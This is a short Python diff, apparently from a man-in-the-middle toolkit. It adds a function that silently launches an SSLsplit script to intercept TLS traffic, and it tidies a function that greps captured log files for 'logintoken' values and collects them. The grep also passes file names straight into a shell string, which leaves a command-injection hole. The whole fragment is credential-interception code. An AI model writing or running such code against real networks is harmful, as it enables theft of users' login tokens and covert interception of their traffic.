@@ -16,11 +16,20 @@ def fetchPasswd():
     import subprocess, os
     result = []
 
-    filenames = os.listdir("logdir")
+    filenames = os.listdir("MITM/logdir")
     for filename in filenames:
         commandStr = 'head -n 20 {} | grep "logintoken"'.format("MITM/logdir/" + filename)
         content = os.popen(commandStr).read()
-        content = content[0:len(content)-1]
-        result.append(content)
-        print(content)
+        if len(content) > 0:
+            content = content[0:len(content)-1]
+            result.append(content)
+        print(content, end = ' ')
+    print("")
     return result
+
+def runSSLSplit():
+    import subprocess, os
+    pid = subprocess.Popen(["sh", "MITM/mySSLsplit.sh"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+    return pid
+
+pid = runVPN()
